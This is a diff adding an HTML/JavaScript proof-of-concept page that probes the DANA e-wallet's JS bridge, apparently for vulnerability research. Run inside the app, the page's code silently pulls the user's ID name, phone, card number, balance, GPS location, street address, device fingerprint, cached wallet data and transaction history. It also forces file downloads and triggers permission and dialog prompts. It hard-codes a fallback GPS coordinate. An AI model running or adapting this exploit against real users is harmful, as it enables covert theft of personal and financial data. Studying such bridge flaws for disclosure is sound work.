@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>DANA H5 Bridge Test v8</title>
+<style>
+  body{font-family:monospace;background:#111;color:#0f0;padding:12px;font-size:12px;margin:0;padding-top:24px}
+  h3{color:#ff0;margin:14px 0 4px;font-size:13px}
+  .ok{color:#0f0}.err{color:#f55}.pending{color:#888}
+  pre{white-space:pre-wrap;word-break:break-all;background:#000;padding:8px;border:1px solid #333;margin:4px 0;max-height:220px;overflow:auto}
+  button{background:#050;color:#0f0;border:1px solid #0f0;padding:14px;margin:8px 0;font-size:15px;width:100%;font-weight:bold}
+  button.mini{width:auto;padding:6px 10px;font-size:11px;background:#220;color:#ff0;border:1px solid #660;font-weight:normal}
+  button:disabled{background:#222;color:#666;border-color:#444}
+  #status{position:fixed;top:0;left:0;right:0;background:#330;color:#ff0;padding:5px;font-size:11px;z-index:9}
+  .note{color:#0ff;margin:4px 0}
+  .warn{color:#f80;margin:4px 0}
+  .phase{color:#0ff;font-size:15px;margin:16px 0 2px;border-bottom:1px solid #066;padding-bottom:2px}
+</style>
+</head>
+<body>
+<div id="status">v8 boot...</div>
+<h3 style="color:#0ff">v8 - CLEAN-NETWORK RE-RUN (2 phases)</h3>
+<p class="note">PHASE 1 (blocks 0-5) runs automatically now &mdash; it works even while HTTP Toolkit is still connected. You should see results appear below within ~1 minute.</p>
+<p class="warn">PHASE 2 (blocks 6-16) = network probes. Tap the PHASE 2 button ONLY AFTER you fully DISCONNECT HTTP Toolkit (ADB intercept off / proxy cleared). If blocks 7-9 still show "CertPathValidatorException" it means the proxy is still on: disconnect properly and tap the button again (it re-runs everything).</p>
+<p class="warn">Popups expected during PHASE 2 (that is the point): [14] Android permission dialog &rarr; TAP DENY, [15] QR scanner opens &rarr; just back out, [16] native dialog &rarr; tap OK. Afterwards also check your Downloads for a file "poc_v8_dl...".</p>
+
+<div class="phase">PHASE 1 &mdash; auto (local probes, MITM-tolerant)</div>
+<h3>[0] env</h3><pre id="p-0" class="pending">pending</pre>
+<h3>[1] getUserInfoData (full dump re-confirm)</h3><pre id="p-1" class="pending">pending</pre>
+<h3>[2] getLocationInfo (silent GPS - fresh)</h3><pre id="p-2" class="pending">pending</pre>
+<h3>[3] locationName (GPS coords -&gt; street address)</h3><pre id="p-3" class="pending">pending</pre>
+<h3>[4] getAkuDeviceInfo (device fingerprint)</h3><pre id="p-4" class="pending">pending</pre>
+<h3>[5] nativeCache (get wallet/phone + round-trip)</h3><pre id="p-5" class="pending">pending</pre>
+
+<div class="phase">PHASE 2 &mdash; manual (tap ONLY after HTTP Toolkit disconnected)</div>
+<button id="btn2" onclick="runPhase2()">&#9654; RUN PHASE 2 (network probes - HTTP Toolkit must be OFF)</button>
+<h3>[6] netcheck (fetch ping.txt - info)</h3><pre id="p-6" class="pending">pending</pre>
+<h3>[7] requestApi partner.invoke (real opType)</h3><pre id="p-7" class="pending">pending</pre>
+<h3>[8] requestApi user.info.masking (real opType)</h3><pre id="p-8" class="pending">pending</pre>
+<h3>[9] createShortLink (dana.id shortlink?)</h3><pre id="p-9" class="pending">pending</pre><button class="mini" onclick="copyBlock('p-9')">copy [9]</button>
+<h3>[10] getTransactionHistoryList (forceCache:false - fresh network)</h3><pre id="p-10" class="pending">pending</pre><button class="mini" onclick="copyBlock('p-10')">copy [10]</button>
+<h3>[11] queryPayMethod</h3><pre id="p-11" class="pending">pending</pre>
+<h3>[12] download generalDownload (file to device)</h3><pre id="p-12" class="pending">pending</pre>
+<h3>[13] downloadFile w/ filePath</h3><pre id="p-13" class="pending">pending</pre>
+<h3>[14] requestPermissions READ_CONTACTS (PERMISSION DIALOG - TAP DENY)</h3><pre id="p-14" class="pending">pending</pre>
+<h3>[15] scanQr (SCANNER MAY OPEN - JUST BACK OUT)</h3><pre id="p-15" class="pending">pending</pre>
+<h3>[16] customDialog A/B (DIALOG MAY APPEAR - TAP OK)</h3><pre id="p-16" class="pending">pending</pre>
+
+<button onclick="copyAll()">COPY ALL RESULTS (compact)</button>
+<button class="mini" onclick="runMini()" style="width:100%;padding:10px">[17] OPTIONAL LAST: callSubApp mini:// (may navigate away - do COPY ALL first)</button>
+
+<script>
+(function(){
+  var RESULTS = {};
+  var LOG = [];
+  var running = false;
+  var attempt = 0;
+  var GPS_FALLBACK = {lat:'-7.4254221', long:'111.3005175'};
+
+  function compact(o){
+    try { return typeof o === 'string' ? o : JSON.stringify(o); } catch(e) { return String(o); }
+  }
+  function set(id, obj, cls){
+    var el = document.getElementById(id);
+    el.className = cls || 'ok';
+    try { el.textContent = (typeof obj === 'string') ? obj : JSON.stringify(obj, null, 1); } catch(e) { el.textContent = String(obj); }
+    RESULTS[id] = obj;
+  }
+  var statusEl = document.getElementById('status');
+  function status(t){ statusEl.textContent = t; }
+
+  function bridgeReady(cb){
+    if (window.AlipayJSBridge) return cb();
+    document.addEventListener('AlipayJSBridgeReady', function(){ cb(); }, false);
+    setTimeout(cb, 5000);
+  }
+  function call(api, param, timeoutMs){
+    return new Promise(function(resolve){
+      var done = false;
+      var t = setTimeout(function(){ if(!done){ done = true; resolve({__timeout:true, waitedMs:timeoutMs||15000}); } }, timeoutMs || 15000);
+      try {
+        window.AlipayJSBridge.call(api, param || {}, function(r){
+          if (!done) { done = true; clearTimeout(t); resolve(r); }
+        });
+      } catch(e) {
+        if (!done) { done = true; clearTimeout(t); resolve({__exception:String(e)}); }
+      }
+    });
+  }
+  function sleep(ms){ return new Promise(function(r){ setTimeout(r, ms); }); }
+
+  window.copyBlock = function(id){
+    var ta = document.createElement('textarea');
+    ta.value = id + ': ' + compact(RESULTS[id]);
+    document.body.appendChild(ta); ta.select();
+    try { document.execCommand('copy'); status('copied ' + id); } catch(e) { status('copy failed'); }
+    document.body.removeChild(ta);
+  };
+  window.copyAll = function(){
+    var lines = [];
+    lines.push('v8 @ ' + location.href);
+    lines.push('log: ' + compact(LOG));
+    ['p-0','p-1','p-2','p-3','p-4','p-5','p-6','p-7','p-8','p-9','p-10','p-11','p-12','p-13','p-14','p-15','p-16'].forEach(function(k){
+      if (RESULTS[k] !== undefined) lines.push(k + ': ' + compact(RESULTS[k]));
+    });
+    var ta = document.createElement('textarea');
+    ta.value = lines.join('\n');
+    document.body.appendChild(ta); ta.select();
+    try { document.execCommand('copy'); status('copied - paste it back'); } catch(e) { status('copy failed - screenshot'); }
+    document.body.removeChild(ta);
+  };
+
+  function netcheck(){
+    var t0 = Date.now();
+    return fetch('ping.txt?cb=' + Date.now(), {cache:'no-store'})
+      .then(function(r){
+        return {ok:true, httpStatus:r.status, viaHeader:r.headers.get('x-via-mitm'), ms:Date.now()-t0};
+      })
+      .catch(function(e){ return {ok:false, err:String(e).slice(0,80), ms:Date.now()-t0}; });
+  }
+
+  window.runMini = async function(){
+    set('p-16', RESULTS['p-16']);
+    var r = await call('callSubApp', {url:'mini://?title=v8probe'}, 8000);
+    alert('[17] callSubApp mini:// -> ' + compact(r));
+  };
+
+  window.runPhase2 = async function(){
+    if (running) return;
+    if (!window.AlipayJSBridge) { status('no bridge - cannot run phase 2'); return; }
+    running = true; attempt++;
+    var btn = document.getElementById('btn2');
+    btn.disabled = true;
+    LOG.push({attempt:attempt, startedAt:new Date().toISOString()});
+    try {
+      status('P2/' + attempt + ' [6] netcheck');
+      set('p-6', await netcheck());
+
+      status('P2/' + attempt + ' [7] requestApi partner.invoke');
+      set('p-7', await call('requestApi', {operationType:'id.dana.minitunnel.partner.invoke', payload:{}}, 20000));
+
+      status('P2/' + attempt + ' [8] requestApi user.info.masking');
+      set('p-8', await call('requestApi', {operationType:'id.dana.minitunnel.user.info.masking', payload:{}}, 20000));
+
+      status('P2/' + attempt + ' [9] createShortLink');
+      set('p-9', await call('createShortLink', {url:'https://rfypych.github.io/poc/ping.txt'}, 20000));
+
+      status('P2/' + attempt + ' [10] getTransactionHistoryList');
+      set('p-10', await call('getTransactionHistoryList', {event:'getInitList', pageNum:1, forceCache:false}, 25000));
+
+      status('P2/' + attempt + ' [11] queryPayMethod');
+      set('p-11', await call('queryPayMethod', {}, 15000));
+
+      status('P2/' + attempt + ' [12] download generalDownload');
+      set('p-12', await call('download', {event:'generalDownload', info:{url:'https://rfypych.github.io/poc/ping.txt', fileName:'poc_v8_dl', fileFormat:'.txt'}}, 20000));
+
+      status('P2/' + attempt + ' [13] downloadFile w/ filePath');
+      set('p-13', await call('downloadFile', {url:'https://rfypych.github.io/poc/ping.txt', filePath:'v8probe.txt', downloadTaskId:3}, 20000));
+
+      status('P2/' + attempt + ' [14] requestPermissions - DENY IF DIALOG');
+      set('p-14', await call('requestPermissions', {event:'request', info:{permissions:['android.permission.READ_CONTACTS']}}, 30000));
+
+      status('P2/' + attempt + ' [15] scanQr - BACK OUT OF SCANNER');
+      set('p-15', await call('scanQr', {info:{codeConsumer:'native', scene:'v8poc'}}, 15000));
+
+      status('P2/' + attempt + ' [16] customDialog A');
+      var dA = await call('customDialog', {event:'common', info:{title:'[PoC v8 A]', message:'This native dialog was requested by a third-party web page. Tap OK.', button:'OK'}}, 12000);
+      var dB = await call('customDialog', {event:'common', title:'[PoC v8 B]', message:'Variant B (flat params). Tap OK.', button:'OK'}, 12000);
+      set('p-16', {A:dA, B:dB});
+
+      LOG.push({attempt:attempt, finishedAt:new Date().toISOString(), note:'phase2 complete'});
+      status('DONE P2 attempt ' + attempt + ' - COPY ALL, then optionally [17]');
+    } catch(e) {
+      status('phase2 error: ' + String(e).slice(0,60));
+    }
+    running = false;
+    btn.disabled = false;
+    btn.innerHTML = '&#8635; RE-RUN PHASE 2 (if CertPathValidatorException appeared, HTTP Toolkit was still on - disconnect + tap again)';
+  };
+
+  bridgeReady(async function(){
+    if (!window.AlipayJSBridge){
+      set('p-0', {noBridge:true, href:location.href, ua:navigator.userAgent.slice(0,80)}, 'err');
+      status('NO BRIDGE (browser?) - open inside DANA container');
+      return;
+    }
+    var sp = {};
+    try { sp = window.AlipayJSBridge.startupParams || {}; } catch(e){}
+    set('p-0', {hasBridge:true, appId:sp.appId, startScene:sp.startScene||sp.scene, href:location.href.slice(0,70)});
+    status('P1 [1] getUserInfoData');
+
+    set('p-1', await call('getUserInfoData', {event:'getUserInformation', info:{queryBy:'ktpName,globalPhoneNumber,userPan,userId,kycLevel,balance'}}, 20000));
+
+    status('P1 [2] getLocationInfo');
+    var gps = await call('getLocationInfo', {}, 15000);
+    set('p-2', gps);
+
+    var c = {lat:GPS_FALLBACK.lat, long:GPS_FALLBACK.long, src:'fallback'};
+    try {
+      var la = gps && (gps.latitude || gps.lat || (gps.location && (gps.location.latitude || gps.location.lat)));
+      var lo = gps && (gps.longitude || gps.long || gps.lng || (gps.location && (gps.location.longitude || gps.location.long)));
+      if (la !== undefined && lo !== undefined){ c = {lat:String(la), long:String(lo), src:'fresh-gps'}; }
+    } catch(e){}
+    status('P1 [3] locationName (' + c.src + ')');
+    set('p-3', await call('locationName', {info:{lat:c.lat, long:c.long}}, 15000));
+
+    status('P1 [4] getAkuDeviceInfo');
+    set('p-4', await call('getAkuDeviceInfo', {}, 15000));
+
+    status('P1 [5] nativeCache');
+    var gW = await call('nativeCache', {info:{event:'get', key:'walletDetail'}}, 12000);
+    var gP = await call('nativeCache', {info:{event:'get', key:'phoneNumber'}}, 12000);
+    var gS = await call('nativeCache', {info:{event:'save', key:'poc_v8', data:'marker8'}}, 12000);
+    var gG = await call('nativeCache', {info:{event:'get', key:'poc_v8'}}, 12000);
+    set('p-5', {getWallet:gW, getPhone:gP, save:gS, getPoc:gG});
+
+    LOG.push({phase1Done:new Date().toISOString()});
+    status('PHASE 1 DONE - now DISCONNECT HTTP Toolkit, then tap RUN PHASE 2');
+  });
+})();
+</script>
+</body>
+</html>
